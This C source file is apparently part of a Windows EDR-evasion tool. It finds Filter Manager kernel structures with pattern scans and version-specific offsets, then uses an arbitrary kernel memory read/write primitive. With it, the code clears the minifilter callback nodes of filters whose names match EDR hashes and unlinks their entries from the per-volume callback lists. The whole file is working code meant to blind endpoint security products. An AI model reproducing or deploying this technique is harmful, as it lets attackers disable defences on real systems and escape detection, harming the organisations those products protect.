#include "Common.h"
#include "Structs.h"

#include "RemoveCallBacks.h"

#include "stdio.h"

#define MAX_CALLBACK_NODES 50
#define CALLBACK_NODE_SIZE 8

static inline SIZE_T GetInstanceOffset(DWORD major, DWORD build) {
	
	return
		(major == 10 && build == 26100) ? 0xD8 : // 0x70 + 0x68
		(major == 10) ? 0xD0 :      // 0x68 + 0x68
		(major == 6) ? 0xC0 :       // 0x58 + 0x68
		0;  
}

static inline SIZE_T GetInstanceListOffset(DWORD major, DWORD build) {
	return
		(major == 10 && build == 26100) ? 0x78 :
		(major == 10) ? 0x70 :
		(major == 6) ? 0x60 : 
		0;
}

static inline SIZE_T GetCallbackNodeOffset(DWORD major, DWORD build) { // rename callbacknode
	return
		(major == 10 && build == 26100) ? 0x130 : // Windows11 24H2
		(major == 10 && build < 22000) ? 0xa0 :
		(major == 10 && build >= 22000) ? 0xa8 :
		(major == 6) ? 0x90 : 0;
}

static inline SIZE_T GetFilterCallbackOffset(DWORD major, DWORD build) { 
	return
		(major == 10 && build == 26100) ? 0x140 :
		(major == 10) ? (build >= 22621 ? 0x130 : 0x120) :
		(major == 6) ? 0x110 : 
		0;
}

VOID RemoveInstanceCallback(INT64 FLT_FILTERAddr) {
	INT64 FilterInstanceAddr = 0;

	DWORD dwMajor = GetNtVersion();
	DWORD dwBuild = GetNtBuild();

	SIZE_T instanceListOffset = GetInstanceListOffset(dwMajor, dwBuild);
	SIZE_T instanceOffset = GetInstanceOffset(dwMajor, dwBuild);
	SIZE_T CallbackNodeOffset = GetCallbackNodeOffset(dwMajor, dwBuild);

	if (!instanceListOffset || !instanceOffset || !CallbackNodeOffset) {
		PRINT("[RemoveInstanceCallback] Error: Windows version %d is not supported\n", dwMajor);
		return;
	}

	DriverMemoryOperation((VOID*)(FLT_FILTERAddr + instanceOffset),
		&FilterInstanceAddr,
		8,
		MEMORY_WRITE);

	// Count instances in list
	INT64 FirstLink = FilterInstanceAddr;
	INT64 data = 0;
	INT count = 0;

	do {
		count++;
		INT64 tmpAddr = 0;
		DriverMemoryOperation((VOID*)(FilterInstanceAddr), &tmpAddr, 8, MEMORY_WRITE);
		FilterInstanceAddr = tmpAddr;
	} while (FirstLink != FilterInstanceAddr);
	count--;

	// Process each instance
	INT i = 0;
	do {
		FilterInstanceAddr -= instanceListOffset;
		PRINT("\t\t(i)FLT_INSTANCE 0x%I64x\n", FilterInstanceAddr);
		AddEDRIntance(FilterInstanceAddr);

		// Clear callback nodes
		for (INT nodeIndex = 0; nodeIndex < MAX_CALLBACK_NODES; nodeIndex++) {
			INT64 CallbackNodeData = 0;

			DriverMemoryOperation((VOID*)(FilterInstanceAddr + CallbackNodeOffset + nodeIndex * 8),
				&CallbackNodeData, 8, MEMORY_WRITE);

			if (CallbackNodeData != 0) {
				PRINT("\t\t\t[%d] : 0x%I64x\t[Clear]\n", nodeIndex, CallbackNodeData);
				DriverMemoryOperation(&data, (VOID*)(FilterInstanceAddr + CallbackNodeOffset + nodeIndex * 8),
					8, MEMORY_WRITE);
			}
		}

		// Move to next instance
		INT64 tmpAddr = 0;
		DriverMemoryOperation((VOID*)(FilterInstanceAddr + instanceListOffset), &tmpAddr, 8, MEMORY_WRITE);
		FilterInstanceAddr = tmpAddr;
		i++;
	} while (i < count);
}

VOID ClearMiniFilterCallBack(INT64 FltEnumerateFiltersAddr) {

	DWORD dwMajor = GetNtVersion();
	DWORD dwBuild = GetNtBuild();

	INT64 FrameAddrPTR = 0;
	INT64 FLT_FRAMEAddr = 0;
	UINT64 offset = 0;
	UINT64 FltGlobalsAddr = 0;

	INT64 FLT_FILTERAddr = 0;
	ULONG FilterCount = 0;
	INT64 FLT_VOLUMESAddr = 0;
	ULONG FLT_VOLUMESCount = 0;

	INT64 FilterCallbackOffset = GetFilterCallbackOffset(dwMajor, dwBuild);

	PRINT("\n\n----------------------------------------------------\n");
	PRINT("Register MiniFilter Callback driver:");
	PRINT("\n\n----------------------------------------------------\n");

	// Validate function address
	if (!FltEnumerateFiltersAddr) {
		PRINT("FltEnumerateFilters function address not found.\n");
		return;
	}

	FltGlobalsAddr = FindPattern(FltEnumerateFiltersAddr, &PREDEFINED_PATTERNS[3], 300);
	offset = CalculateOffset(FltGlobalsAddr, 2, 6);

	// Get Frame address pointer
	FrameAddrPTR = FltGlobalsAddr + 7 + offset;

	// Get FLT_FRAME address
	DriverMemoryOperation((VOID*)FrameAddrPTR, &FLT_FRAMEAddr, 8, MEMORY_WRITE);
	FLT_FRAMEAddr -= 0x8;
	PRINT("FLT_FRAME: 0x%I64x\n", FLT_FRAMEAddr);

	// Get FLT_FILTER address
	DriverMemoryOperation((VOID*)(FLT_FRAMEAddr + 0xB0), &FLT_FILTERAddr, 8, MEMORY_WRITE);
	INT64 FilterFirstLink = FLT_FILTERAddr;

	// Get filter count
	DriverMemoryOperation((VOID*)(FLT_FRAMEAddr + 0xC0), &FilterCount, 4, MEMORY_WRITE);

	INT i = 0;
	do {
		FLT_FILTERAddr -= 0x10;
		CHAR* FilterName = ReadDriverName(FLT_FILTERAddr);
		if (FilterName == NULL) break;
		PRINT("\tFLT_FILTER %s: 0x%I64x\n", FilterName, FLT_FILTERAddr);

		if (IsEDRHash(FilterName)) {
			RemoveInstanceCallback(FLT_FILTERAddr);
		}

		// Move to next filter
		INT64 tmpaddr = 0;
		DriverMemoryOperation((VOID*)(FLT_FILTERAddr + 0x10), &tmpaddr, 8, MEMORY_WRITE);
		FLT_FILTERAddr = tmpaddr;
		i++;
	} while (i < FilterCount);

	// Get FLT_VOLUMES address
	// 0x130 = 0xc8 + 0x68
	DriverMemoryOperation((VOID*)(FLT_FRAMEAddr + 0x130), &FLT_VOLUMESAddr, 8, MEMORY_WRITE);

	// Get volumes count
	DriverMemoryOperation((VOID*)(FLT_FRAMEAddr + 0x140), &FLT_VOLUMESCount, 4, MEMORY_WRITE);

	PRINT("\tFLT_VOLUMESCount: %d\n", FLT_VOLUMESCount);

	// should be modified!!
	// 1/17/2025
	i = 0;
	do {
		FLT_VOLUMESAddr -= 0x10;
		PRINT("\tFLT_VOLUMES [%d]: %I64x\n", i, FLT_VOLUMESAddr);

		// Get callback offset based on OS version

		if (!FilterCallbackOffset) {
			PRINT("[FilterCallbackOffset] Windows system version not supported yet.\n");
			return;
		}

		INT64 VolumesCallback = FLT_VOLUMESAddr + FilterCallbackOffset;
		// Process callback nodes
		for (INT callbackIndex = 0; callbackIndex < MAX_CALLBACK_NODES; callbackIndex++) {

			INT64 FlinkAddr = VolumesCallback + (callbackIndex * 16);
			INT64 Flink = 0;

			INT nodeCount = 0;
			INT nodeIndex = 0;

			DriverMemoryOperation((VOID*)FlinkAddr, &Flink, 8, MEMORY_WRITE);
			INT64 Blink = 0;
			DriverMemoryOperation((VOID*)(FlinkAddr + 8), &Blink, 8, MEMORY_WRITE);

			INT64 First = Flink;
			// Count nodes in the list
			do {
				nodeCount++;
				INT64 NextFlink = 0;
				DriverMemoryOperation((VOID*)First, &NextFlink, 8, MEMORY_WRITE);
				First = NextFlink;
			} while (FlinkAddr != First);

			// Process each node in the list
			INT64 CurLocate = Flink;
			do {
				INT64 NextFlink = 0;
				DriverMemoryOperation((VOID*)CurLocate, &NextFlink, 8, MEMORY_WRITE);
				if (IsEDRIntance(callbackIndex, CurLocate)) {
					INT64 tmpNextFlink = 0;
					DriverMemoryOperation((VOID*)CurLocate, &tmpNextFlink, 8, MEMORY_WRITE);
					DriverMemoryOperation(&tmpNextFlink, (VOID*)FlinkAddr, 8, MEMORY_WRITE);
					DriverMemoryOperation(&tmpNextFlink, (VOID*)(FlinkAddr + 8), 8, MEMORY_WRITE);
				}
				else {
					FlinkAddr = CurLocate;
				}

				CurLocate = NextFlink;
				nodeIndex++;
			} while (nodeIndex < nodeCount);
		}

		// Move to next volume
		INT64 tmpaddr = 0;
		DriverMemoryOperation((VOID*)(FLT_VOLUMESAddr + 0x10), &tmpaddr, 8, MEMORY_WRITE);
		FLT_VOLUMESAddr = tmpaddr;
		i++;
	} while (i < FLT_VOLUMESCount);
}